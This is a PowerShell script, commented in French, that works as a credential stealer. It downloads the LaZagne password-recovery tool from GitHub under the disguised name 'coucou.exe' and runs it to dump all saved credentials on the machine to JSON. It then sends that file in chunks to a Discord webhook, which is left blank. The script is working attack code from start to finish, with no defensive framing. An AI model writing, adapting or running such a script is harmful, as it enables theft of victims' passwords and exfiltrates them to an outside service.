# Utilisez le dossier actuel pour le téléchargement du fichier
$downloadPath = (Get-Location).Path

# Spécifiez l'URL du webhook Discord
$webhookUrl = ""


if (!(Test-Path -Path $downloadPath)) {
    New-Item -Path $downloadPath -ItemType Directory
}

# Téléchargement du fichier Lazagne.exe
$url = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe"
$outFile = Join-Path $downloadPath "coucou.exe"

Invoke-WebRequest -Uri $url -OutFile $outFile

while (!(Test-Path $outFile)) {
    Start-Sleep -Milliseconds 500
}

# Exécuter le fichier lazagne.exe coucou.exe avec arguments
$arguments = "all -oJ -output $($downloadPath)"
Start-Process -FilePath $outFile -ArgumentList $arguments -Wait -NoNewWindow

while (!(Test-Path (Join-Path $downloadPath "credentials*"))) {
    Start-Sleep -Milliseconds 500
}


# Chercher le fichier qui commence par "credentials" dans le répertoire courant
$filePath = (Get-ChildItem -Path ".\*" -Filter "credentials*.json").FullName

# Vérifier si le fichier a été trouvé
if ($null -ne $filePath) {
    # Lire le contenu du fichier JSON dans une variable
    $jsonContent = Get-Content $filePath -Raw

    # Convertir le contenu JSON en une chaîne de caractères
    $jsonString = $jsonContent | Out-String
}
else {
    Write-Host "Fichier 'credentials' non trouvé."
}


# Convertir le contenu JSON en une chaîne de caractères
$jsonString = $jsonContent | Out-String

# Calculer le nombre de morceaux car discord accepte 2000 caractères par message
$numberOfChunks = [math]::Ceiling($jsonString.Length / 2000)

# Envoyer chaque morceau par message
for ($i=0; $i -lt $numberOfChunks; $i++) {
    $start = $i * 2000
    $end = $start + 2000 - 1
    $chunk = $jsonString.Substring($start, [math]::Min($end + 1, $jsonString.Length) - $start)

    # Envoyer le morceau à Discord
    Invoke-RestMethod -Uri $webhookUrl -Method POST -Body (@{'content'=$chunk} | ConvertTo-Json) -ContentType 'application/json'
}
